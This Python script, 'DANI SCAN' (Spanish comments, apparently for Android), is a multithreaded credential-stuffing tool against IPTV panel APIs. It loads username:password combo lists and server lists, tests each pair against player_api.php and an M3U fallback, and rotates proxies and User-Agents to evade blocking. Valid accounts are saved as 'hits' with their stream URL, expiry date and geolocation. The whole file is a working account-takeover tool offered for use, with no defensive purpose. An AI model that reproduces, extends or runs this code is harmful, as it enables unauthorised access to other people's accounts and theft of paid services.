import os
import sys
import time
import threading
import queue
import random
import socket
import urllib3
from datetime import datetime
from urllib.parse import urlparse, parse_qs
from collections import defaultdict, deque

# Desactivar advertencias de SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

try:
    import requests
except ImportError:
    print("Instalando requests...")
    import subprocess
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests[socks]"])
    import requests

# ===================== CONFIGURACIÓN DANI SCAN =====================
BASE = "/sdcard/ESTEBAN_SCAN"
OUT_DIR        = os.path.join(BASE, 'hits')
COMBO_DIR      = os.path.join(BASE, 'listas')
COMBO_HITS_DIR = os.path.join(BASE, 'combo')
HOST_DIR       = os.path.join(BASE, 'host_txt')
PROXY_DIR      = os.path.join(BASE, "proxys")

for d in [BASE, OUT_DIR, COMBO_DIR, COMBO_HITS_DIR, HOST_DIR, PROXY_DIR]:
    os.makedirs(d, exist_ok=True)

# Colores
RED = '\x1b[91m'
YELLOW = '\x1b[93m'
BLUE = '\x1b[94m'
GREEN = '\x1b[92m'
RESET = '\x1b[0m'

# ===================== ESTADOS GLOBALES =====================
_stop_early = threading.Event()
_pause_scan = threading.Event()
_display_lock = threading.Lock()
_results_lock = threading.Lock()
_start_time = time.time()
HIT_CASCADE = deque(maxlen=5)
M3U_FALLBACK = True

# ===================== BANNER DANI EN MOVIMIENTO =====================
def banner_esteban():
    os.system('clear' if os.name != 'nt' else 'cls')
    
    try:
        w = os.get_terminal_size().columns
    except:
        w = 50 
        
    # Texto exacto solicitado
    text = f"{YELLOW}🐒DANI🐒{RESET}"
    text_len = 8 # Longitud visual para el rebote (emojis ocupan 2 espacios)
    row = 3
    
    pos = 0
    direction = 1
    
    # EFECTO REBOTE (Estilo DVD)
    for _ in range(w * 2): 
        # Borramos la posición anterior
        sys.stdout.write(f"\033[{row};{pos}H")
        sys.stdout.write(" " * text_len)
        
        # Escribimos en la nueva posición
        sys.stdout.write(f"\033[{row};{pos}H")
        sys.stdout.write(text)
        sys.stdout.flush()
        
        pos += 2 * direction
        
        # Rebote en los bordes
        if pos >= w - text_len or pos <= 0:
            direction *= -1
            
        time.sleep(0.02)
        
    # Limpiar pantalla y centrar el texto final
    sys.stdout.write("\033[H\033[J")
    center_pos = (w // 2) - (text_len // 2)
    
    sys.stdout.write(f"\033[{row};{center_pos}H")
    sys.stdout.write(text)
    
    sys.stdout.write(f"\033[{row + 2};{center_pos - 5}H")
    sys.stdout.write(f"{RED}⚡️ SYSTEM ACTIVADO ⚡️{RESET}")
    
    sys.stdout.flush()
    time.sleep(1.5)

# ===================== UTILIDADES =====================
def _bar(p, L=30):
    p = max(0.0, min(1.0, float(p or 0.0)))
    return '█' * int(L * p) + '░' * (L - int(L * p))

def resolve_ip(host):
    try: return socket.gethostbyname(host)
    except: return "—"

def geo_lookup(ip):
    if not ip or ip == "—": return "Desconocido"
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=country,city,isp", timeout=5, verify=False)
        j = r.json()
        return f"{j.get('city','')}, {j.get('country','')} ({j.get('isp','')})"
    except: return "Desconocido"

# ===================== RED Y PROXIES =====================
_thread_local = threading.local()

def get_session(server, proxy=None):
    cur = getattr(_thread_local, "session", None)
    if cur is None or getattr(_thread_local, "srv", None) != server:
        s = requests.Session()
        s.headers.update({"User-Agent": random.choice(["Mozilla/5.0", "Chrome/120", "Safari/605"]), "Connection": "close"})
        if proxy: s.proxies = {"http": proxy, "https": proxy}
        _thread_local.session = s
        _thread_local.srv = server
        return s
    return cur

def fetch_json(url, server, timeout=6, proxy=None):
    try:
        r = get_session(server, proxy).get(url, timeout=timeout, verify=False)
        if r.status_code == 200: return r.json()
    except: pass
    return None

def check_m3u_fallback(server, user, pwd):
    try:
        r = get_session(server).get(f"http://{server}/get.php?username={user}&password={pwd}&type=m3u_plus", timeout=4, verify=False)
        if r and "#EXTM3U" in r.text and r.text.count("#EXTINF") >= 3: return True
    except: pass
    return False

def check_target(server, item, proxy=None):
    user, pwd = item
    eff_timeout = 6.0
    
    data = fetch_json(f"http://{server}/player_api.php?username={user}&password={pwd}", server, timeout=eff_timeout, proxy=proxy)
    if data and str(data.get('user_info', {}).get('status', '')).lower() in ['active', '1', 'true', 'ok']:
        return True, data
    
    if M3U_FALLBACK:
        if check_m3u_fallback(server, user, pwd):
            return True, {"user_info": {"status": "Active (M3U)"}}
    return False, {}

def choose_proxy():
    files = [f for f in os.listdir(PROXY_DIR) if os.path.isfile(os.path.join(PROXY_DIR, f))]
    if not files: return None
    print(f"\n{BLUE}Proxys disponibles:{RESET}")
    for i, f in enumerate(files, 1): print(f"{YELLOW}{i}➠ {f}{RESET}")
    try:
        c = int(input(f"\n{RED}Elige proxy (0=Sin proxy) ➜ {RESET}"))
        if c == 0: return None
        path = os.path.join(PROXY_DIR, files[c-1])
        return [l.strip() for l in open(path, 'r', errors='ignore') if l.strip() and not l.startswith('#')]
    except: return None

# ===================== WORKER (HILOS) =====================
def worker(tasks_q, stats, server_hits, combo_name, total_checks, proxies_list):
    thread_proxy = random.choice(proxies_list) if proxies_list else None
    if thread_proxy and not thread_proxy.startswith("http"): thread_proxy = f"http://{thread_proxy}"
    
    while not _stop_early.is_set():
        if _pause_scan.is_set(): time.sleep(0.1); continue
        
        try: 
            server, item = tasks_q.get_nowait()
        except queue.Empty: 
            break
        
        ok, data = check_target(server, item, proxy=thread_proxy)
        
        with _display_lock:
            stats['checks'] += 1
            stats['cpm'] = int(stats['checks'] / max(1, time.time() - _start_time) * 60)
        
        if ok:
            user, pwd = item
            host = server.split(':')[0]
            
            with _display_lock:
                stats['hits'] += 1
                server_hits[server] = server_hits.get(server, 0) + 1
                HIT_CASCADE.append(f"{YELLOW}🎯 http://{host:<15} | {user:<8} | {pwd:<8} 🐒{RESET}")
            
            # --- EXTRACCIÓN DE DATOS AVANZADA ---
            user_info = data.get('user_info', {})
            status = user_info.get('status', 'Desconocido')
            max_conn = user_info.get('max_connections', 'Desconocido')
            
            exp_timestamp = user_info.get('exp_date')
            if exp_timestamp and str(exp_timestamp).isdigit() and int(exp_timestamp) > 0:
                exp_date_str = datetime.fromtimestamp(int(exp_timestamp)).strftime("%Y-%m-%d %H:%M:%S")
            else:
                exp_date_str = "Ilimitada / Sin datos"
                
            scan_date_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            m3u_url = f"http://{server}/get.php?username={user}&password={pwd}&type=m3u_plus"
            
            hit_text = f"""
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┣   😎DANIEL🇦🇷3885😎 SCAN     ┣
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
┣ 🌐 Server: http://{server}
┣ 👤 User: {user}
┣ 🔑 Pass: {pwd}
┣ 📺 URL M3U: {m3u_url}
┣ 🫀 Status: {status}
┣ 📅 Escaneado: {scan_date_str}
┣ ⏳ Expiración: {exp_date_str}
┣ 🔌 Máx. Conectados: {max_conn}
┣ 📍 Geo: {geo_lookup(resolve_ip(host))}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
🐒DANI🇦🇷3885🐒
"""
            with _results_lock:
                try:
                    with open(os.path.join(COMBO_HITS_DIR, f"{host}.txt"), "a") as f: 
                        f.write(f"{user}:{pwd}\n")
                    with open(os.path.join(OUT_DIR, f"ESTEBAN⟮{host}⟯.txt"), "a") as f:
                        f.write(hit_text)
                except Exception as e: 
                    pass
            
        tasks_q.task_done()

# ===================== INTERFAZ =====================
def draw_panel(combo_name, stats, total_checks, server_hits, num_proxies=0):
    with _display_lock:
        sys.stdout.write("\033[H\033[J")
        elapsed = int(time.time() - _start_time)
        prog = stats['checks'] / total_checks if total_checks else 0
        
        # Cabecera fija durante el escaneo
        print(f"{YELLOW}🐒DANI🐒{RESET}")
        print(f"{RED}⚡ DANI SCAN | Combo: {combo_name} | Tiempo: {time.strftime('%H:%M:%S', time.gmtime(elapsed))}{RESET}")
        print(f"{YELLOW}⚡ Progreso: {prog*100:.2f}% [{_bar(prog, 30)}] ({stats['checks']}/{total_checks}){RESET}")
        print(f"{RED}⚡ Hits: {GREEN}{stats['hits']}{RESET} | {RED}CPM: {YELLOW}{stats['cpm']}{RESET} | {RED}Proxys: {YELLOW}{num_proxies}{RESET}")
        
        if _pause_scan.is_set(): print(f"\n{GREEN}⏸️ PAUSA ACTIVADA (Pulsa E para reanudar){RESET}")
        
        print(f"\n{BLUE}━━━━━ ÚLTIMOS HITS ━━━━━{RESET}")
        if HIT_CASCADE:
            for h in list(HIT_CASCADE): print(h)
        else:
            print(f"{RED}Buscando... 🐒{RESET}")
        sys.stdout.flush()

def keyboard_listener():
    try:
        import termios, tty, select
        fd = sys.stdin.fileno()
        old = termios.tcgetattr(fd)
        try:
            tty.setcbreak(fd)
            while not _stop_early.is_set():
                if select.select([sys.stdin], [], [], 0.1)[0]:
                    ch = sys.stdin.read(1).lower()
                    if ch == 'f': _stop_early.set(); break
                    if ch == 'p': _pause_scan.set()
                    if ch == 'e': _pause_scan.clear()
        finally: termios.tcsetattr(fd, termios.TCSADRAIN, old)
    except: pass

# ===================== MENSAJES =====================
def msg(txt, color=YELLOW): print(f"{color}{txt}{RESET}")

# ===================== MAIN =====================
def main():
    global M3U_FALLBACK, _start_time
    sys.stdout.write("\033[H\033[J"); sys.stdout.flush()
    banner_esteban()
    
    msg("\n🐒 DANI SCAN - Modo TXT Directo 🐒\n", BLUE)
    
    items_by_server, combo_name = {}, ""
    
    try:
        sfiles = [f for f in os.listdir(HOST_DIR) if f.endswith(".txt")]
        if not sfiles: msg("No hay archivos de host en /host_txt.", RED); return
        for i, f in enumerate(sfiles, 1): print(f"{YELLOW}{i}➠ {f}{RESET}")
        sc = int(input(f"{RED}Elige archivo de servidores ➜ {RESET}"))
        raw_servers = [s.strip().replace("http://","").replace("/","") for s in open(os.path.join(HOST_DIR, sfiles[sc-1]), 'r', errors='ignore') if s.strip()]
        
        cfiles = [f for f in os.listdir(COMBO_DIR) if os.path.isfile(os.path.join(COMBO_DIR, f))]
        if not cfiles: msg("No hay archivos de combo en /listas.", RED); return
        for i, f in enumerate(cfiles, 1): print(f"{YELLOW}{i}➠ {f}{RESET}")
        cc = int(input(f"{RED}Elige archivo de combos ➜ {RESET}"))
        combo_path = os.path.join(COMBO_DIR, cfiles[cc-1])
        combo_name = cfiles[cc-1]
        
        all_items = [(l.split(':')[0].strip(), l.split(':')[1].strip()) for l in open(combo_path, 'r', errors='ignore') if ':' in l]
        
        for s in raw_servers:
            if ":" not in s: s = f"{s}:80"
            items_by_server[s] = all_items
            
    except (ValueError, IndexError) as e:
        msg(f"Error al seleccionar archivos: {e}", RED); return

    servers = list(items_by_server.keys())
    if not servers: msg("No hay objetivos.", RED); return
    
    M3U_FALLBACK = input(f"\n{RED}¿Usar Fallback M3U si API falla? (s/n) ➜ {RESET}").strip().lower() in ('s', 'y', '1')
    proxies_list = choose_proxy()
    
    total_checks = sum(len(v) for v in items_by_server.values())
    stats = {'hits': 0, 'checks': 0, 'cpm': 0}
    server_hits = {s: 0 for s in servers}
    
    try: n_threads = int(input(f"{RED}Hilos (Enter=80) ➜ {RESET}") or 80)
    except: n_threads = 80
    
    tasks_q = queue.Queue()
    for s in servers:
        pairs = [(s, it) for it in items_by_server[s]]
        random.shuffle(pairs)
        for pair in pairs: tasks_q.put(pair)
        
    threading.Thread(target=keyboard_listener, daemon=True).start()
    
    msg(f"\n🚀 INICIANDO ESCANEO CON {n_threads} HILOS... (Pulsa F para detener, P para pausar)\n", YELLOW)
    time.sleep(2)
    _start_time = time.time()
    
    pools = []
    for i in range(n_threads):
        t = threading.Thread(target=worker, args=(tasks_q, stats, server_hits, combo_name, total_checks, proxies_list), daemon=True)
        t.name = f"W{i+1}"
        t.start(); pools.append(t)
        
    while any(t.is_alive() for t in pools):
        if _stop_early.is_set(): break
        draw_panel(combo_name, stats, total_checks, server_hits, len(proxies_list) if proxies_list else 0)
        time.sleep(0.2)
        
    msg(f"\n\n✅ ESCANEO TERMINADO. Total Hits: {stats['hits']}", GREEN)
    msg(f"Resultados guardados en: {OUT_DIR}", BLUE)
    msg(f"\n🐒DANI🇦🇷3885🐒", YELLOW)

if __name__ == '__main__':
    try: main()
    except KeyboardInterrupt: _stop_early.set(); print(f"\n{RED}Cancelado.{RESET}\n🐒DANI🇦🇷3885🐒")